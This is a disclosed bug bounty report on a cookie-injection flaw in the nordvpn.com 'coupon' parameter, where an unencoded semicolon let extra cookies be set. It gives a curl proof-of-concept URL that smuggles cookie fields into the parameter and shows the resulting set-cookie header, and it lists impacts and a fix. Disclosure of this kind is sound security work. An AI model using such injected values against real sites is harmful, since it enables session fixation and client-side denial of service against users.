# Arbitrary Set-Cookie via "?coupon=" due to semi-colon not encoded

## Report Details
- **Report ID**: 806577
- **URL**: https://hackerone.com/reports/806577
- **State**: Closed
- **Severity**: low
- **Submitted**: 2020-02-27T22:08:48.994Z
- **Disclosed**: 2020-04-03T09:42:39.066Z

## Reporter
- **Username**: yuyudhn
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nordsecurity

## Vulnerability Information
Related to <https://tools.ietf.org/html/rfc2965>, the separator in the cookie header is semi-colon (;) and this issue is caused by semicolon (;) not encoded, so the attacker can arbitrarily manipulate cookies.

Arbitrary set cookie will cause several problems like:
- Session Fixation
- Cookie Bomb (Client-Side DoS)
- Etc

**Vulnerable Endpoint:** <https://nordvpn.com/?coupon=HERE;+Cookie1=XXXXX;+Cookie2=WWWWWWW;+Cookie3=EOF>

# Proof of Concept

```
bash:~$ curl -I "https://nordvpn.com/?coupon=HERE;+Cookie1=XXXXX;+Cookie2=WWWWWWW;+Cookie3=EOF"
```

```
HTTP/2 200 
date: Thu, 27 Feb 2020 21:32:41 GMT
content-type: text/html; charset=UTF-8
set-cookie: __cfduid=de45d1c8c4f2d3aa1406cfcde0face9471582839161; expires=Sat, 28-Mar-20 21:32:41 GMT; path=/; domain=.nordvpn.com; HttpOnly; SameSite=Lax; Secure
cf-ray: 56bd45d50e7acc28-SIN
cache-control: public, max-age=1800
expires: Thu, 27 Feb 2020 22:02:41 GMT
link: <https://nordvpn.com/>; rel=shortlink
set-cookie: locale=en; expires=Fri, 26 Feb 2021 21:32:41 GMT; path=/; domain=nordvpn.com; HttpOnly
strict-transport-security: max-age=31536000; includeSubDomains; preload
vary: Accept-Encoding
cf-cache-status: MISS
expect-ct: max-age=604800, report-uri="https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct"
pragma: no-cache
set-cookie: coupon=HERE; Cookie1=XXXXX; Cookie2=WWWWWWW; Cookie3=EOF; expires=Thu, 05 Mar 2020 21:32:41 GMT; path=/; domain=nordvpn.com
x-cache: MISS
x-frame-options: SAMEORIGIN
x-generator: front-kr-web-2
server: cloudflare
```

See at **set-cookie:** response.

**Reference:**
- https://hackerone.com/reports/195045 (Arbitrary Set Cookie Via SVG)

# Fix
Encode semicolon ";" in headers.

**RFC 2965 Note:** For backward compatibility, the separator in the Cookie header is semi-colon (;) everywhere.  A server SHOULD **also accept comma (,) as the separator** between cookie-values for future compatibility.

Maybe you should encode comma too.

## Impact

Attacker can arbitrarily manipulate cookies.



### Other Impact (possible/false positive):
- Session Fixation (Remote Attack)
- Cookie Bomb (Client-side DoS)
- CSRF Protection Bypass (example: <https://hackerone.com/reports/14883>)

Thank you.

## Attachments
No attachments
